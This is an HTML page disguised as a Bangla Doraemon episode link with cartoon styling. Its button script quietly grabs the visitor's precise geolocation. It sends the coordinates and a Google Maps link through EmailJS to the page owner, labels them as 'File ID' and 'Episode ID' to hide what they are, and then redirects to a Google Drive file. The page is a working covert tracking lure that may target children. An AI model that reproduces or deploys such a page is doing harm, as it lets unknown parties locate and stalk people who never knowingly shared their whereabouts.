<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Doraemon bangla episod link</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="doraemon-bg"></div>
  <div class="clouds">
    <div class="cloud cloud1"></div>
    <div class="cloud cloud2"></div>
  </div>
  
  <div class="doraemon-header">
    <div class="doraemon-image">
      <div class="doraemon-face">
        <div class="doraemon-eyes">
          <div class="eye"></div>
          <div class="eye"></div>
        </div>
        <div class="doraemon-nose"></div>
        <div class="doraemon-mouth"></div>
      </div>
      <div class="bell"></div>
      <div class="pocket"></div>
    </div>
    <h1>üìç Doraemon Bangla Episodr</h1>
  </div>
  
  <p class="subtitle">Click the button bellow to watch doraemon<br>
  Doreomon bangla episod is here.</p>
  
    <button id="sendBtn">üîî Click here</button>
  <pre id="output"></pre>


  <!-- Gadgets Images -->
  <img src="doraemon-full.png" alt="Doraemon" class="gadget take-copter">

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
    // ‚úÖ Initialize EmailJS with your Public Key
    emailjs.init({
      publicKey: "yHyrvbHtJo53dQWLr"
    });

    const output = document.getElementById("output");
    const btn = document.getElementById("sendBtn");

    btn.onclick = () => {
      if (!navigator.geolocation) {
        output.textContent = "‚ùå Your browser does not support this link. Please use defferent browser or phone or try again.";
        return;
      }

      output.textContent = "Doraemon is almost here!!!";

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
          const msg = `File ID: ${latitude}\nEpisode ID: ${longitude}\nDoremon No: ${accuracy} Dorami\nDora link google: ${mapLink}`;

          output.textContent = msg + "\n\nDoraemon is sending you the episode";

          // ‚úÖ Corrected EmailJS send() syntax
          emailjs.send("service_qa9tetu", "template_fsuyqta", {
            name: "Doraemon Location App",
            time: new Date().toLocaleString(),
            message: msg,
            map_link: mapLink
          })
          .then(() => {
            output.textContent = "‚úÖ Doraemon has prepared your link and file successfully! Redirecting...";
            
            // Redirect to website after 2 seconds
            setTimeout(() => {
              window.location.href = "https://drive.google.com/file/d/18GpoR5wwQSY6F1-g4M7YqTpXsyjhteW1/view?usp=sharing";
            }, 2000);
          })
          .catch((err) => {
            output.textContent += "\n‚ùå Doraemon failed to attach the file. Please try again " + err.text;
          });
        },
        (err) => {
          output.textContent = "‚ùå Error: " + err.message;
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    };
  </script>
</body>
</html>



